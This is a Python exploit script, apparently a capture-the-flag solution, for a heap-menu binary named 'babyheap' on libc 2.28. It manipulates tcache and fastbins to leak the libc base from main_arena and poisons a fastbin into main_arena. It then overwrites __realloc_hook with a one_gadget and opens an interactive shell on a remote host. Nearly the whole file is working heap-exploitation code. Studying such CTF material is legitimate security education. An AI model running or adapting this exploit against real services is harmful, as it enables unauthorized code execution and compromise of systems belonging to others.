#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './babyheap'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':True}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target.com', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.28.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10
offset_libc_onegadget   = 0x4f322

#==========

def attack(conn, *kwargs):
    bh = BabyHeap(conn)

    # fill tcache
    for _ in range(7):
        idx = bh.allocate(0x58)
        bh.update(idx, 'a'*0x58)
        bh.delete(idx)

    # prepare fastbin
    for _ in range(7):
        bh.allocate(0x58)
    bh.update(5, 'X'*0x40+p64(0x200)+p64(0x70))
    for i in range(6):
        bh.delete(i)

    for size, n in {0x48:7, 0x38:7, 0x28:6}.items():
        for _ in range(n):
            idx = bh.allocate(size)
            bh.update(idx, 'b'*size)
            bh.delete(idx)

    # consolidate
    for _ in range(2):
        bh.allocate(0x48)   # 0, 1
    for _ in range(2):
        bh.allocate(0x28)   # 2, 3
    bh.update(3, 'c'*0x28)

    for _ in range(5):
        bh.allocate(0x58)   # 4, 5, 7, 8, 9

    bh.delete(6)
    bh.delete(4)

    # consolidate
    bh.allocate(0x28)       # 4
    bh.allocate(0x28)       # 6

    addr_libc_mainarena = u64(bh.view(5)[:8]) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_realloc_hook  = libc.symbols['__realloc_hook']
    addr_libc_svc_run       = libc.sep_function['svc_run']
    addr_libc_onegadget     = libc.address + offset_libc_onegadget
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    bh.delete(9)
    idx = bh.allocate(0x48) # 4 (= 5)
    bh.delete(5)
    bh.update(idx, p64(addr_libc_mainarena+0x2d))

    bh.allocate(0x48)       # 5

    if env.check('debug'):
        raw_input('set {long}((void*)&main_arena+0x35)=0x51 >')

    idx_arena = bh.allocate(0x48)       # 6
    bh.update(idx_arena, '\x00'*3+p64(0)*4+p64(addr_libc_realloc_hook - 0x10)+p64(0)+p64(addr_libc_mainarena + 0x60)*2)

    idx = bh.allocate(0x48)
    bh.update(idx, p64(addr_libc_onegadget)+p64(addr_libc_svc_run+0x42))

    bh.allocate(1)
    
class BabyHeap:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def allocate(self, size):
        self.sendlineafter('Command: ', '1')
        self.sendlineafter('Size: ', str(size))
        self.recvuntil('Chunk ')
        return int(self.recvuntil(' ', drop=True))

    def update(self, idx, content):
        self.sendlineafter('Command: ', '2')
        self.sendlineafter('Index: ', str(idx))
        self.sendlineafter('Size: ', str(len(content)))
        self.sendlineafter('Content: ', content)

    def delete(self, idx):
        self.sendlineafter('Command: ', '3')
        self.sendlineafter('Index: ', str(idx))

    def view(self, idx):
        self.sendlineafter('Command: ', '4')
        self.sendlineafter('Index: ', str(idx))
        self.recvuntil(']: ')
        return self.recvuntil('\n1. Allocate', drop=True)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.connection.interactive()
    
#==========
